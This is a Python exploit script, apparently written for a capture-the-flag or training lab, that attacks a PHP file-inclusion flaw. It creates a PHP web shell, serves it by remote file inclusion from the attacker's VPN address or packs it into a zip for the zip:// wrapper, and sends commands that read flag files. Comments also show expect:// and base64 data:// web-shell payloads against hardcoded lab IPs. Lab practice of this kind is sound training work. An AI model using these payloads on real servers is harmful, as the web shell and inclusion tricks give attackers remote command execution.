#!/usr/bin/python3

"""
PHP => (fuck xD)
provides some additional wrappers which can be leveraged
to gain command execution.


Expect Wrapper:

    The expect wrapper in PHP => (fuck xD) along by spawning the target at the end 
    of this section first. The target used here is an example. which you need to 
    replace with the IP address of your spawned target.
"""

from zipfile import ZipFile
import re
import subprocess
import requests
import os
import base64
import urllib.parse as parser



def remote_file_inclusion(base_url: str):

    # making a simple snippet for the execution
    ip_address = get_os_environ()
    print(ip_address)
    snipt = "<?php system($_GET['cmd']); ?>"
    if not os.path.exists("exec.php"):
        with open("exec.php", "w") as f:
            f.write(snipt)


    sess = requests.session()
    response = sess.get(url=base_url+f"/index.php?language=http://{ip_address}:8000/exec.php&cmd=cat /exercise/flag.txt").text
    grep = re.search(r'<h2>Containers</h2>\n.*', response)
    print(grep.group())


def execute_wrappers(base_url: str) -> None:
    """
    The data wrapper can be used to include external data, even PHP(fuck xD) code. It's possible to use 
    this only if the <allow_url_include> setting is enable in the PHP (fuck xD) configuration. This can be found in the file 

    /etc/php/X.Y/apache2/php.ini => For Apache
    /etc/php/X.Y/fpm/php.ini => for NGINX


    example of how to use the wrappers
        http://178.62.19.68:31452/index.php?language=expect://id
    """
    # fuck_php_snipet = "<?php system($_GET['cmd']); ?>"
    snipt = "<?php system($_GET['cmd']); ?>"

    if os.path.exists("exec.php") is False:
        with open("exec.php", "w") as f:
            f.write(snipt)

    if os.path.exists("malicious.zip") is False:
        with ZipFile("malicious.zip", "w") as zip_file:
            zip_file.write('exec.php')

    sess = requests.session()
    # response = sess.get(url=base_url+"/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id").text

    # implementation another wrapper type
    # if you want to send a malicous fucking php as value, you must to add the wrapper zip
    response = sess.get(url=base_url+"/index.php?language=zip://malicious.zip%23exec.php&cmd=cat /secrets/flag.txt").text

    # grep = re.search(r'uid.*', response)
    # print(grep.group())

    grep = re.search(r'<h2>Containers</h2>\n.*', response)
    print(grep.group())


def get_os_environ() -> str:

    try:
        output = subprocess.check_output("ifconfig tun0", stderr=subprocess.STDOUT ,shell=True)
        ip_vpn = re.search(r'\d{1,4}\.\d{1,3}\.\d{1,4}\.\d{1,4}', output.decode())
        return ip_vpn.group()
    except Exception:
        return """\n\t[*] Not possible to reach vpn address.\n\t[*] Please connect to a VPN provided"""

def main():
    # execute_wrappers(base_url="http://178.62.19.68:30563")
    # print(get_os_environ())

    remote_file_inclusion(base_url="http://10.129.29.114")

if __name__ == "__main__":
    main()
